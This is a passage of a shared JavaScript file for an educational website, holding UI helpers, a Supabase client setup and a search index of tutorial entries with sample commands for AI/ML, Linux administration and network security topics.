/* ============================================================
   main.js — ONE shared script for the whole site
   - network_lab.html / project.html: no data-page attribute,
     runs the Network Lab section below unconditionally
     (it only touches elements that exist on those two pages).
   - index.html / doc.html / ai.html / linux.html / netsec.html /
     python.html: each IIFE below checks <html data-page="...">
     and only runs its own block on the matching page.
   ============================================================ */


/* ============================================================
   Network Lab — shared script
   - index.html: render the project grid
   - project.html: render a single project (id from ?id=...)
   - lightbox for image previews
   ============================================================ */

/* ---------- Doc Page Helpers ---------- */
window.toggleSidebar = function() {
  const sidebar = document.getElementById('sidebar');
  const overlay = document.getElementById('sidebar-overlay');
  if (!sidebar || !overlay) return;
  sidebar.classList.toggle('open');
  overlay.style.display = sidebar.classList.contains('open') ? 'block' : 'none';
};

window.closeSidebar = function() {
  if (window.innerWidth <= 1024) {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebar-overlay');
    if (sidebar) sidebar.classList.remove('open');
    if (overlay) overlay.style.display = 'none';
  }
};

window.toggleSection = function(header) {
  const links = header.nextElementSibling;
  if (!links) return;
  header.classList.toggle('collapsed');
  links.classList.toggle('collapsed');
  if (!links.classList.contains('collapsed')) {
    links.style.maxHeight = links.scrollHeight + 'px';
  } else {
    links.style.maxHeight = '0';
  }
};

window.copyCode = function(button) {
  const container = button.closest('.code-container');
  if (!container) return;
  const code = container.querySelector('.code-block').textContent;
  navigator.clipboard.writeText(code).then(() => {
    const original = button.innerText;
    button.innerText = '✓ Copied!';
    button.classList.add('copied');
    setTimeout(() => {
      button.innerText = original;
      button.classList.remove('copied');
    }, 2000);
  });
};

window.scrollToTop = function() {
  window.scrollTo({ top: 0, behavior: 'smooth' });
};

function initTypewriter(phrases, elementId) {
  const typeEl = document.getElementById(elementId);
  if (!typeEl) return;
  let phraseIndex = 0, charIndex = 0, isDeleting = false;
  function type() {
    const current = phrases[phraseIndex];
    if (isDeleting) {
      typeEl.textContent = current.substring(0, charIndex - 1);
      charIndex--;
    } else {
      typeEl.textContent = current.substring(0, charIndex + 1);
      charIndex++;
    }
    let speed = isDeleting ? 60 : 100;
    if (!isDeleting && charIndex === current.length) {
      speed = 2000;
      isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      phraseIndex = (phraseIndex + 1) % phrases.length;
      speed = 500;
    }
    setTimeout(type, speed);
  }
  type();
}

/* ---------- Global Configuration ---------- */
const SUPABASE_URL = 'https://cwwqmushilpxzpcpjute.supabase.co';
const SUPABASE_KEY = 'sb_publishable__AzVitbAoaYfEyvJMnIkkQ_AOkXCfbK';
const SUPABASE = (window.supabase && typeof window.supabase.createClient === 'function')
  ? window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY)
  : (console.warn('Supabase SDK failed to load from CDN — features relying on it are disabled.'), null);

const pageSearchIndexes = {
  ai: [
    { title: "Introduction to AI & ML", desc: "What AI and ML are, and how they relate", id: "intro" },
    { title: "Types of Machine Learning", desc: "Supervised, unsupervised, reinforcement", id: "ml-types" },
    { title: "Math Foundations", desc: "Linear algebra, calculus, probability", id: "math-foundations" },
    { title: "Environment Setup", desc: "venv, conda, TensorFlow, PyTorch, Jupyter — python3 -m venv ai-env; source ai-env/bin/activate; ai-env\\Scripts\\activate (Windows); conda create -n ai-env python=3.11; conda activate ai-env; pip install numpy pandas matplotlib scikit-learn", id: "setup" },
    { title: "NumPy Fundamentals", desc: "Arrays, broadcasting, vectorized ops — import numpy as np; a = np.array([ 1 , 2 , 3 ]) zeros = np.zeros(( 3 , 4 )) ones = np.ones(( 2 , 2 )) rand = np.random.rand( 3 , 3 ); print (a.shape, a.dtype) b = np.arange( 12 ).reshape( 3 , 4 ); c…", id: "numpy" },
    { title: "Pandas for Data Manipulation", desc: "DataFrames, cleaning, grouping, merging — import pandas as pd; df = pd.read_csv( 'data.csv' ); df.head() df.info() df.describe() df.shape; df[ 'age' ] df[[ 'age' , 'income' ]] df.loc[df[ 'age' ] > 30 ] df.iloc[ 0 : 5 ]; df.isnull(). sum () df.dropna() df.fillna(df.mean(numeric_only= True )); df.groupby( 'category' )[ 'sales' ]. sum ();…", id: "pandas" },
    { title: "Data Visualization", desc: "Matplotlib, Seaborn, distributions, heatmaps — import matplotlib.pyplot as plt import seaborn as sns; sns.histplot(df[ 'age' ], kde= True ); sns.scatterplot(data=df, x= 'income' , y= 'spending' , hue= 'segment' );…", id: "visualization" },
    { title: "Data Preprocessing", desc: "Scaling, encoding, feature engineering", id: "preprocessing" },
    { title: "Scikit-learn Basics", desc: "Pipelines, fit/predict API — from sklearn.pipeline import Pipeline from sklearn.preprocessing import StandardScaler from sklearn.ensemble import RandomForestClassifier; pipeline = Pipeline([ ( 'scaler' , StandardScaler()), ( 'model' , RandomForestClassifier(n_estimators= 100 )) ]); pipeline.fit(X_train, y_train) predictions =…", id: "sklearn" },
    { title: "Regression Algorithms", desc: "Linear, Ridge, Lasso, tree-based regressors — from sklearn.linear_model import Ridge from sklearn.ensemble import RandomForestRegressor from sklearn.metrics import mean_squared_error, r2_score; model = RandomForestRegressor(n_estimators= 200 , random_state= 42 ) model.fit(X_train, y_train) preds = model.predict(X_test); print ( \"RMSE:\" ,…", id: "regression" },
    { title: "Classification Algorithms", desc: "Logistic regression, SVM, trees, boosting — from sklearn.linear_model import LogisticRegression from sklearn.metrics import classification_report, confusion_matrix; clf = LogisticRegression(max_iter= 1000 ) clf.fit(X_train, y_train) preds = clf.predict(X_test); print (classification_report(y_test, preds)) print (confusion_matrix(y_test,…", id: "classification" },
    { title: "Clustering & Dim. Reduction", desc: "K-Means, DBSCAN, PCA, t-SNE", id: "clustering" },
    { title: "Ensemble Methods", desc: "Bagging, boosting, stacking, XGBoost — from xgboost import XGBClassifier; model = XGBClassifier( n_estimators= 300 , learning_rate= 0.05 , max_depth= 6 , subsample= 0.8 ) model.fit(X_train, y_train)", id: "ensemble" },
    { title: "Evaluation Metrics", desc: "Accuracy, precision, recall, F1, ROC-AUC", id: "metrics" },
    { title: "Overfitting & Regularization", desc: "L1/L2, dropout, early stopping", id: "regularization" },
    { title: "Cross-Validation & Tuning", desc: "K-Fold, GridSearchCV, Optuna — from sklearn.model_selection import cross_val_score, GridSearchCV from sklearn.ensemble import RandomForestClassifier; scores = cross_val_score(RandomForestClassifier(), X, y, cv= 5 ) print ( \"Mean accuracy:\" , scores.mean()); param_grid = { 'n_estimators' : [ 100 , 200 , 300 ], 'max_depth' : […", id: "tuning" },
    { title: "Neural Network Fundamentals", desc: "Neurons, activations, backpropagation", id: "neural-networks" },
    { title: "TensorFlow & Keras", desc: "Sequential models, compile, fit — import tensorflow as tf from tensorflow import keras; model = keras.Sequential([ keras.layers.Dense( 64 , activation= 'relu' , input_shape=( 20 ,)), keras.layers.Dropout( 0.3 ), keras.layers.Dense( 32 , activation= 'relu' ), keras.layers.Dense( 1 , activation= 'sigmoid' ) ]); model. compile (…", id: "tensorflow" },
    { title: "PyTorch", desc: "nn.Module, autograd, training loops — import torch import torch.nn as nn; class Net (nn.Module): def __init__ (self): super ().__init__() self.fc1 = nn.Linear( 20 , 64 ) self.fc2 = nn.Linear( 64 , 1 ) self.relu = nn.ReLU() self.sigmoid = nn.Sigmoid() def forward (self, x): x = self.relu(self.fc1(x)) return self.sigmoid(self.fc2(x));…", id: "pytorch" },
    { title: "Convolutional Networks", desc: "CNNs for computer vision", id: "cnn" },
    { title: "Recurrent Networks & Sequences", desc: "RNN, LSTM, GRU, Seq2Seq — model = keras.Sequential([ keras.layers.Embedding(input_dim= 10000 , output_dim= 64 ), keras.layers.LSTM( 64 , return_sequences= False ), keras.layers.Dense( 1 , activation= 'sigmoid' ) ])", id: "rnn" },
    { title: "Transformers & Attention", desc: "Self-attention, BERT, GPT architecture", id: "transformers" },
    { title: "Natural Language Processing", desc: "Embeddings, NER, sentiment analysis", id: "nlp" },
    { title: "Computer Vision", desc: "Detection, segmentation, image generation", id: "computer-vision" },
    { title: "Generative AI & LLMs", desc: "LLMs, diffusion models, RAG, RLHF", id: "generative-ai" },
    { title: "Transfer Learning", desc: "Pretrained models, fine-tuning — from tensorflow.keras.applications import MobileNetV2; base_model = MobileNetV2(weights= 'imagenet' , include_top= False , input_shape=( 224 , 224 , 3 )) base_model.trainable = False; model =…", id: "transfer-learning" },
    { title: "Reinforcement Learning", desc: "Agents, rewards, Q-learning, PPO", id: "reinforcement-learning" },
    { title: "Model Deployment & MLOps", desc: "Serving, versioning, monitoring — import joblib joblib.dump(model, 'model.pkl' ) loaded = joblib.load( 'model.pkl' ); from fastapi import FastAPI app = FastAPI(); @app.post ( \"/predict\" ) def predict (features: list ): return {…", id: "deployment" },
    { title: "Ethics & Responsible AI", desc: "Bias, fairness, privacy, explainability", id: "ethics" },
    { title: "Why Python Dominates AI/ML", desc: "A minimal \"hello world\" of machine learning. — from sklearn.linear_model import LinearRegression; X = [[ 1 ], [ 2 ], [ 3 ], [ 4 ]] y = [ 2 , 4 , 6 , 8 ]; model = LinearRegression() model.fit(X, y) print (model.predict([[ 5 ]]))", id: "intro-why-python-dominates-ai-ml" },
    { title: "Linear Algebra", desc: "Data in ML is represented as vectors and matrices . A neural network layer is fundamentally a matrix multiplication followed by a non-linear function. — import numpy as np; v = np.array([ 1 , 2 , 3 ]) M = np.array([[ 1 , 2 ], [ 3 , 4 ]]); result = np.dot(M, v[: 2 ]); M.T np.linalg.inv(M)", id: "math-foundations-linear-algebra" },
    { title: "Calculus (Gradients)", desc: "Training a model means minimizing a loss function . Gradient descent uses the derivative of the loss with respect to each parameter to know which direction…", id: "math-foundations-calculus-gradients" },
    { title: "Checking GPU Availability", desc: "import torch print (torch.cuda.is_available()); import tensorflow as tf print (tf.config.list_physical_devices( 'GPU' ))", id: "setup-checking-gpu-availability" },
    { title: "Scaling & Encoding", desc: "Feature scaling (mean 0, std 1) — required for many algorithms. — from sklearn.preprocessing import StandardScaler, OneHotEncoder from sklearn.model_selection import train_test_split; scaler = StandardScaler() X_scaled = scaler.fit_transform(X_train); encoder = OneHotEncoder(sparse_output= False ) X_cat =…", id: "preprocessing-scaling-encoding" },
    { title: "Dimensionality Reduction", desc: "PCA: project high-dimensional data onto principal components. — from sklearn.decomposition import PCA from sklearn.cluster import KMeans; pca = PCA(n_components= 2 ) X_reduced = pca.fit_transform(X_scaled) print (pca.explained_variance_ratio_); kmeans = KMeans(n_clusters= 3 , random_state= 42 , n_init= 'auto' ) labels =…", id: "clustering-dimensionality-reduction" },
    { title: "Core Layers", desc: "model = keras.Sequential([ keras.layers.Conv2D( 32 , ( 3 , 3 ), activation= 'relu' , input_shape=( 64 , 64 , 3 )), keras.layers.MaxPooling2D(( 2 , 2 )), keras.layers.Conv2D( 64 , ( 3 , 3 ), activation= 'relu' ), keras.layers.MaxPooling2D(( 2 , 2 )),…", id: "cnn-core-layers" },
    { title: "Core Ideas", desc: "from transformers import AutoTokenizer, AutoModel; tokenizer = AutoTokenizer.from_pretrained( 'bert-base-uncased' ) model = AutoModel.from_pretrained( 'bert-base-uncased' ); inputs = tokenizer( \"Transformers changed AI.\" , return_tensors= 'pt' ) outputs =…", id: "transformers-core-ideas" },
    { title: "Common NLP Tasks", desc: "from transformers import pipeline; classifier = pipeline( 'sentiment-analysis' ) result = classifier( \"This documentation is really helpful!\" ) print (result)", id: "nlp-common-nlp-tasks" },
    { title: "Common Vision Tasks", desc: "from tensorflow.keras.applications import ResNet50 from tensorflow.keras.applications.resnet50 import preprocess_input, decode_predictions; model = ResNet50(weights= 'imagenet' ) preds = model.predict(preprocess_input(image_batch)) print…", id: "computer-vision-common-vision-tasks" }
  ],
  linux: [
    { title: "Introduction to Linux", desc: "What Linux is and why it matters", id: "intro" },
    { title: "Linux Distributions", desc: "Debian, Red Hat, Arch, SUSE and more", id: "distributions" },
    { title: "Terminal Basics", desc: "Shells, history, keyboard shortcuts", id: "terminal" },
    { title: "File System Hierarchy", desc: "The FHS directory structure", id: "filesystem" },
    { title: "Navigation Commands", desc: "pwd, cd, ls, tree, file — pwd; cd /var/log; cd ..; cd ~; cd -; cd ~/Documents; ls; ls -l; ls -la; ls -lh", id: "navigation" },
    { title: "File Operations", desc: "touch, cp, mv, rm, mkdir, ln — touch file.txt; touch {a,b,c}.txt; echo \"Hello\" > file.txt; echo \"World\" >> file.txt; cp file.txt backup.txt; cp -r dir1/ dir2/; cp -i file.txt dest/; cp -v file.txt dest/; cp -a source/ dest/; mv old.txt new.txt", id: "file-ops" },
    { title: "File Permissions", desc: "chmod, umask, rwx notation", id: "permissions" },
    { title: "Ownership & ACL", desc: "chown, chgrp, setfacl, getfacl", id: "ownership" },
    { title: "Archiving & Compression", desc: "tar, gzip, bzip2, xz, zip", id: "archiving" },
    { title: "grep & Regular Expressions", desc: "Pattern matching in text — grep \"error\" logfile.txt; grep -i \"error\" logfile.txt; grep -r \"TODO\" ./src; grep -n \"error\" logfile.txt; grep -v \"debug\" logfile.txt; grep -c \"error\" logfile.txt", id: "grep" },
    { title: "sed Stream Editor", desc: "Non-interactive text substitution — sed 's/foo/bar/' file.txt; sed 's/foo/bar/g' file.txt; sed 's/foo/bar/gi' file.txt; sed -i.bak 's/foo/bar/g' file.txt; sed -i 's/foo/bar/g' file.txt; sed '/^#/d' config.txt; sed -n '5,10p' file.txt; sed '3d' file.txt; sed '/pattern/i\\ New line before ' file.txt; sed '/pattern/a\\ New line after '…", id: "sed" },
    { title: "awk Programming", desc: "Column-based text processing — awk '{print $1, $3}' data.txt; awk -F ',' '{print $2}' data.csv; awk '$3 > 100 {print $1}' data.txt; awk '{sum += $2} END {print sum}' data.txt; awk 'END {print NR}' file.txt; awk '/error/ {count++} END {print count \" errors\"}' log.txt; ps aux | awk '{print $1, $4}' | sort -k2 -nr | head", id: "awk" },
    { title: "Pipes & Redirection", desc: "stdin, stdout, stderr, tee — ls -l | grep \".txt\" | wc -l; echo \"hello\" > out.txt; echo \"world\" >> out.txt; command 2> errors.log; command > all.log 2>&1; command &> all.log; command > /dev/null 2>&1; wc -l < file.txt; cat file.txt; line one", id: "pipes" },
    { title: "Users & Groups", desc: "useradd, usermod, groups — useradd -m -s /bin/bash alice; adduser alice; passwd alice; usermod -aG sudo alice; usermod -s /bin/zsh alice; usermod -L alice", id: "users" },
    { title: "sudo & Privileges", desc: "Privilege escalation, sudoers — sudo apt update; sudo -u www-data whoami; sudo -i; sudo -s; visudo; sudo -l", id: "sudo" },
    { title: "SSH & Remote Access", desc: "Secure shell, scp, rsync, keys — ssh user@192.168.1.10; ssh -p 2222 user@host; ssh -i ~/.ssh/id_ed25519 user@host; ssh-keygen -t ed25519 -C \"me@example.com\"; ssh-copy-id user@host; scp file.txt user@host:/remote/path/", id: "ssh" },
    { title: "Processes & Jobs", desc: "ps, top, htop, job control — ps aux; ps -ef; ps aux | grep nginx; top; htop; pstree; command &; jobs; fg %1; bg %1", id: "processes" },
    { title: "Signals & Kill", desc: "SIGTERM, SIGKILL, kill, pkill — kill 1234; kill -9 1234; kill -SIGKILL 1234; pkill firefox; killall nginx; kill 0; kill -l", id: "signals" },
    { title: "Cron & Scheduling", desc: "crontab and systemd timers — crontab -e; crontab -l; crontab -r; 0 3 * * * /usr/local/bin/backup.sh; */ 15 * * * * /usr/local/bin/healthcheck.sh; 0 0 * * 0 /usr/local/bin/weekly.sh", id: "cron" },
    { title: "Network Commands", desc: "ip, ping, curl, wget, ss — ip a; ip link show; ip route; ip addr add 192.168.1.5/24 dev eth0; ping -c 4 google.com; traceroute google.com; mtr google.com; ss -tulpn; netstat -tulpn; curl -O https://example.com/file.tar.gz", id: "net-commands" },
    { title: "Firewall & iptables", desc: "ufw, firewalld, netfilter rules", id: "firewall" },
    { title: "DNS & Hostname", desc: "dig, nslookup, /etc/hosts — dig example.com; dig example.com MX; dig +short example.com; nslookup example.com; dig -x 8.8.8.8; hostname; hostnamectl set-hostname web01; hostnamectl status; cat /etc/hosts; cat /etc/resolv.conf", id: "dns" },
    { title: "APT (Debian/Ubuntu)", desc: "apt, dpkg package management — apt update; apt upgrade; apt full-upgrade; apt install nginx; apt remove nginx; apt purge nginx; apt autoremove; apt search nginx; apt show nginx; dpkg -l | grep nginx", id: "apt" },
    { title: "DNF/YUM (RHEL/Fedora)", desc: "dnf, rpm package management — dnf check-update; dnf upgrade; dnf install httpd; dnf remove httpd; dnf autoremove; dnf search httpd; dnf info httpd; rpm -qa | grep httpd; rpm -ql httpd; dnf install ./package.rpm", id: "dnf" },
    { title: "Pacman (Arch)", desc: "Arch Linux package management — pacman -Syu; pacman -S neovim; pacman -R neovim; pacman -Rs neovim; pacman -Ss neovim; pacman -Si neovim; pacman -Qi neovim; pacman -Q; pacman -Qe; pacman -Sc", id: "pacman" },
    { title: "Snap, Flatpak & AppImage", desc: "Distro-agnostic packaging — snap install code --classic; snap list; snap remove code; snap refresh; flatpak install flathub org.gimp.GIMP; flatpak list; flatpak run org.gimp.GIMP; flatpak uninstall org.gimp.GIMP; flatpak update; chmod +x App.AppImage", id: "universal" },
    { title: "systemd & Services", desc: "systemctl, unit files — systemctl start nginx; systemctl stop nginx; systemctl restart nginx; systemctl reload nginx; systemctl status nginx; systemctl enable nginx", id: "systemd" },
    { title: "journalctl & Logs", desc: "Reading the systemd journal — journalctl; journalctl -f; journalctl -u nginx.service; journalctl --since \"1 hour ago\"; journalctl --since \"2026-07-20\" --until \"2026-07-21\"; journalctl -b; journalctl -p err; journalctl -k; journalctl --vacuum-size=200M; journalctl --vacuum-time=2weeks", id: "journalctl" },
    { title: "Kernel Modules", desc: "lsmod, modprobe, insmod — lsmod; modinfo nvidia; modprobe nvidia; modprobe -r nvidia; insmod ./mymodule.ko; rmmod mymodule; echo \"nvidia\" >> /etc/modules-load.d/nvidia.conf; echo \"blacklist nouveau\" >> /etc/modprobe.d/blacklist.conf; uname -r; uname -a", id: "kernel" },
    { title: "Disk & Storage", desc: "df, du, lsblk, mount, LVM — df -h; du -sh /var/log; du -h --max-depth=1 /home; lsblk; fdisk -l; fdisk /dev/sdb; parted /dev/sdb; mkfs.ext4 /dev/sdb1; mkfs.xfs /dev/sdb1; mount /dev/sdb1 /mnt/data", id: "disk" },
    { title: "Bash Basics", desc: "Writing your first shell scripts — #!/bin/bash # deploy.sh - simple deployment script echo \"Starting deployment...\" # Run commands cd /var/www/app git pull origin main npm install systemctl restart myapp echo \"Deployment complete!\"; chmod +x deploy.sh; ./deploy.sh; bash deploy.sh; set -euo pipefail", id: "bash-basics" },
    { title: "Variables & Expansion", desc: "Shell variables, arrays, arithmetic — name= \"Alice\"; echo \"Hello, $name\"; echo \"Hello, ${name}!\"; count= $( ls | wc -l ); result= $(( 5 + 3 )); echo $(( count * 2 )); fruits=( \"apple\" \"banana\" \"cherry\" ); echo ${fruits[0]}; echo ${fruits[@]}; echo ${#fruits[@]}", id: "variables" },
    { title: "Conditionals & Loops", desc: "if, for, while, case — if [ $count -gt 10 ]; then echo \"Large\" elif [ $count -gt 0 ]; then echo \"Small\" else echo \"Empty\" fi; if [ \"$name\" == \"Alice\" ]; then echo \"Hi Alice\" ; fi; if [ -f /etc/passwd ]; then echo \"exists\" ; fi; if [ -d /var/log ]; then echo \"is a directory\" ; fi; for i in 1 2 3 4 5; do echo \"Number: $i\"…", id: "conditionals" },
    { title: "Functions", desc: "Reusable bash functions — greet() { local name= $1 echo \"Hello, $name!\" } greet \"Alice\"; is_even() { if [ $(( $1 % 2 )) -eq 0 ]; then return 0 else return 1 fi } if is_even 4; then echo \"even\" ; fi; get_sum() { echo $(( $1 + $2 )) } total= $( get_sum 3 4 ); backup() { local dir= ${1:-/home} tar -czf backup.tar.gz \"$dir\" }", id: "functions" },
    { title: "Security Basics", desc: "Hardening a Linux system — apt install fail2ban; systemctl enable --now fail2ban; fail2ban-client status sshd; ss -tulpn; journalctl -u ssh | grep \"Failed password\"; lastb; find / -xdev -type f -perm -0002 2>/dev/null", id: "security-basics" },
    { title: "SELinux & AppArmor", desc: "Mandatory access control", id: "selinux" },
    { title: "Encryption & Keys", desc: "LUKS, GPG, checksums, TLS — cryptsetup luksFormat /dev/sdb1; cryptsetup open /dev/sdb1 secure_data; mkfs.ext4 /dev/mapper/secure_data; cryptsetup close secure_data; gpg --gen-key; gpg -c secret.txt; gpg secret.txt.gpg; gpg --encrypt --recipient bob@example.com file.txt; gpg --decrypt file.txt.gpg > file.txt; sha256sum file.iso", id: "encryption" },
    { title: "Containers & Docker", desc: "Docker, Dockerfile, Compose — docker run -d -p 8080:80 --name web nginx; docker ps; docker ps -a; docker stop web; docker start web; docker rm web", id: "containers" },
    { title: "Virtualization", desc: "KVM, QEMU, libvirt — egrep -c '(vmx|svm)' /proc/cpuinfo; apt install qemu-kvm libvirt-daemon-system virtinst virt-manager; virsh list --all; virsh start myvm; virsh shutdown myvm; virsh destroy myvm; virt-install --name myvm --memory 2048 --vcpus 2 \\ --disk size=20 --cdrom /path/to/os.iso --os-variant ubuntu24.04", id: "virtualization" },
    { title: "Performance Tuning", desc: "vmstat, iostat, strace, lsof — uptime; vmstat 1; mpstat -P ALL 1; free -h; iostat -x 1; iotop; ps aux --sort=-%cpu | head; ps aux --sort=-%mem | head; lsof -p 1234; strace -p 1234", id: "performance" },
    { title: "Basic Terminal Commands", desc: "Clears everything currently shown in the terminal window and gives you a blank screen. — clear; history; history | grep \"apt\"; ! 42; echo $SHELL; echo $0", id: "terminal-basic-terminal-commands" },
    { title: "Getting Help", desc: "Manual pages - the most comprehensive documentation. — man ls; man -k \"search\"; man 5 passwd; whatis ls; apropos \"copy\"; ls --help", id: "terminal-getting-help" },
    { title: "chmod - Change Permissions", desc: "Numeric mode (owner, group, others) — chmod 755 script.sh; chmod 644 file.txt; chmod 700 private.key; chmod 777 shared/; chmod u+x script.sh; chmod go-w file.txt", id: "permissions-chmod-change-permissions" },
    { title: "Default Permissions with umask", desc: "Check current umask. — umask; umask 027; echo \"umask 027\" >> ~/.bashrc", id: "permissions-default-permissions-with-umask" },
    { title: "Changing Ownership", desc: "Change owner. — chown alice file.txt; chown alice:staff file.txt; chown :staff file.txt; chown -R alice:staff dir/; chgrp developers file.txt; chown --reference=ref.txt file.txt", id: "ownership-changing-ownership" },
    { title: "Access Control Lists (ACL)", desc: "View ACLs. — getfacl file.txt; setfacl -m u:bob:rw file.txt; setfacl -m g:interns:rx script.sh; setfacl -d -m u:bob:rwx project/; setfacl -x u:bob file.txt; setfacl -b file.txt", id: "ownership-access-control-lists-acl" },
    { title: "tar - Tape Archive", desc: "Create archive. — tar -cvf archive.tar dir/; tar -czvf archive.tar.gz dir/; tar -cjvf archive.tar.bz2 dir/; tar -cJvf archive.tar.xz dir/; tar -xvf archive.tar; tar -xzvf archive.tar.gz", id: "archiving-tar-tape-archive" },
    { title: "sudoers Syntax", desc: "/etc/sudoers - format: user host=(runas) commands. — alice ALL=(ALL:ALL) ALL; bob ALL=(ALL) NOPASSWD: ALL; %developers ALL=(ALL) /usr/bin/systemctl restart nginx", id: "sudo-sudoers-syntax" },
    { title: "SSH Config File", desc: "Save per-host shortcuts to ~/.ssh/config instead of typing the full connection details each time. — Host myserver HostName 192.168.1.10 User alice Port 2222 IdentityFile ~/.ssh/id_ed25519; ssh myserver", id: "ssh-ssh-config-file" },
    { title: "systemd Timers (Modern Alternative)", desc: "A timer unit ( /etc/systemd/system/backup.timer ) pairs with a matching .service unit of the same name to schedule it. — [Unit] Description=Run backup daily [Timer] OnCalendar=daily Persistent=true [Install] WantedBy=timers.target; systemctl enable --now backup.timer; systemctl list-timers", id: "cron-systemd-timers-modern-alternative" },
    { title: "ufw (Uncomplicated Firewall — Debian/Ubuntu)", desc: "Allow SSH. — ufw enable; ufw status verbose; ufw allow 22/tcp; ufw allow from 192.168.1.0/24; ufw deny 23; ufw delete allow 22/tcp", id: "firewall-ufw-uncomplicated-firewall-debian-ubuntu" },
    { title: "firewalld (RHEL/Fedora)", desc: "firewall-cmd --state; firewall-cmd --zone=public --add-service=http --permanent; firewall-cmd --zone=public --add-port=8080/tcp --permanent; firewall-cmd --reload; firewall-cmd --list-all", id: "firewall-firewalld-rhel-fedora" },
    { title: "iptables (Low-Level)", desc: "List current rules. — iptables -L -n -v; iptables -A INPUT -p tcp --dport 22 -j ACCEPT; iptables -A INPUT -j DROP; iptables-save > /etc/iptables/rules.v4", id: "firewall-iptables-low-level" },
    { title: "Writing a Custom Unit File", desc: "A minimal service unit for a long-running app, saved as /etc/systemd/system/myapp.service . — [Unit] Description=My Application After=network.target [Service] Type=simple User=appuser WorkingDirectory=/opt/myapp ExecStart=/usr/bin/python3 /opt/myapp/main.py Restart=on-failure [Install] WantedBy=multi-user.target; systemctl daemon-reload; systemctl…", id: "systemd-writing-a-custom-unit-file" },
    { title: "SELinux", desc: "Check current mode. — getenforce; setenforce 0; setenforce 1; ls -Z /var/www/html; ps -eZ; restorecon -Rv /var/www/html", id: "selinux-selinux" },
    { title: "AppArmor", desc: "Status of all profiles. — aa-status; aa-complain /etc/apparmor.d/usr.sbin.nginx; aa-enforce /etc/apparmor.d/usr.sbin.nginx", id: "selinux-apparmor" },
    { title: "Dockerfile Basics", desc: "A Dockerfile describes how to build an image, step by step, layer by layer. — FROM python:3.12-slim WORKDIR /app COPY requirements.txt . RUN pip install -r requirements.txt COPY . . EXPOSE 8000 CMD [ \"python\" , \"app.py\" ]", id: "containers-dockerfile-basics" },
    { title: "Docker Compose", desc: "Compose defines multiple related containers — here a web app and its database — as one file. — services: web: build: . ports: - \"8000:8000\" db: image: postgres:16 environment: POSTGRES_PASSWORD: secret; docker compose up -d", id: "containers-docker-compose" }
  ],
  netsec: [
    { title: "Introduction to Network Security", desc: "CIA triad, security domains, and fundamentals", id: "intro" },
    { title: "OSI Model", desc: "Seven-layer reference model for network communication", id: "osi-model" },
    { title: "TCP/IP Stack", desc: "The practical four-layer internet protocol suite", id: "tcp-ip" },
    { title: "Network Protocols", desc: "ARP, DNS, ICMP and their security implications", id: "protocols" },
    { title: "Firewall Concepts", desc: "Types of firewalls and traffic filtering", id: "firewall-concepts" },
    { title: "iptables", desc: "Classic Linux netfilter firewall", id: "iptables" },
    { title: "nftables", desc: "Modern replacement for iptables — nft list ruleset; nft -f - flush ruleset table inet filter { chain input { type filter hook input priority 0; policy drop; iif \"lo\" accept ct state established,related accept tcp dport 22 ct state new limit rate 4/minute accept tcp dport { 80, 443 } accept log prefix \"DROP: \" drop } chain forward {…", id: "nftables" },
    { title: "firewalld", desc: "Dynamic firewall for RHEL systems — firewall-cmd --state; firewall-cmd --get-active-zones; firewall-cmd --zone=public --list-all; firewall-cmd --get-services; firewall-cmd --permanent --zone=public --add-service=http; firewall-cmd…", id: "firewalld" },
    { title: "UFW", desc: "Uncomplicated Firewall for Ubuntu/Debian — ufw enable; ufw default deny incoming; ufw default allow outgoing; ufw allow ssh; ufw allow 22/tcp; ufw allow http; ufw allow https; ufw allow 8080/tcp; ufw allow from 192.168.1.0/24; ufw allow from 192.168.1.50 to any port 3306", id: "ufw" },
    { title: "Penetration Testing Basics", desc: "Types, methodology, and legal considerations", id: "pentest-intro" },
    { title: "Reconnaissance", desc: "Passive and active information gathering", id: "reconnaissance" },
    { title: "Scanning & Enumeration", desc: "Nmap, service discovery, and enumeration", id: "scanning" },
    { title: "Exploitation", desc: "Vulnerability exploitation with Metasploit", id: "exploitation" },
    { title: "Post-Exploitation", desc: "Privilege escalation, lateral movement, persistence", id: "post-exploitation" },
    { title: "Wireless Standards", desc: "IEEE 802.11 family and wireless modes", id: "wireless-standards" },
    { title: "WEP & WPA", desc: "Wireless encryption evolution and attacks", id: "wep-wpa" },
    { title: "Wireless Attacks", desc: "Evil twin, deauth, WPS, and PMKID attacks", id: "wireless-attacks" },
    { title: "Wireless Defense", desc: "Securing Wi-Fi networks against attacks", id: "wireless-defense" },
    { title: "IDS/IPS Concepts", desc: "Intrusion detection and prevention fundamentals", id: "ids-ips-concepts" },
    { title: "Snort", desc: "Open-source IDS/IPS with rule-based detection — apt install snort; snort -V; snort -T -c /etc/snort/snort.conf; snort -c /etc/snort/snort.conf -i eth0; snort -l /var/log/snort -b -i eth0; snort -Q --daq afpacket -c /etc/snort/snort.conf -i…", id: "snort" },
    { title: "Suricata", desc: "High-performance multi-threaded IDS/IPS — apt install suricata; suricata-update; suricata-update list-sources; suricata-update enable-source et/open; suricata -T -c /etc/suricata/suricata.yaml; suricata -c /etc/suricata/suricata.yaml -i eth0", id: "suricata" },
    { title: "Zeek", desc: "Network analysis framework for security monitoring — apt install zeek; zeek -i eth0; zeek -r capture.pcap; ls *.log; cat conn.log | zeek-cut id.orig_h id.resp_h service; cat http.log | zeek-cut host uri status_code", id: "zeek" },
    { title: "SIEM & Log Analysis", desc: "Centralized security monitoring and threat detection", id: "siem" },
    { title: "VPN Types", desc: "Remote access, site-to-site, and mesh VPNs", id: "vpn-types" },
    { title: "OpenVPN", desc: "SSL/TLS VPN setup and configuration — apt install openvpn easy-rsa; make-cadir ~/openvpn-ca; cd ~/openvpn-ca; ./easyrsa init-pki; ./easyrsa build-ca nopass; ./easyrsa gen-req server nopass; ./easyrsa sign-req server server; ./easyrsa gen-dh; ./easyrsa gen-req client1 nopass; ./easyrsa sign-req client client1", id: "openvpn" },
    { title: "WireGuard", desc: "Modern fast and simple VPN protocol — apt install wireguard; wg genkey | tee privatekey | wg pubkey > publickey; [ Interface ]; PrivateKey = YOUR_SERVER_PRIVATE_KEY; Address = 10.200.200.1/24; ListenPort = 51820; PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE; PostDown = iptables -D…", id: "wireguard" },
    { title: "IPsec", desc: "Standard protocol suite for secure IP communications", id: "ipsec" },
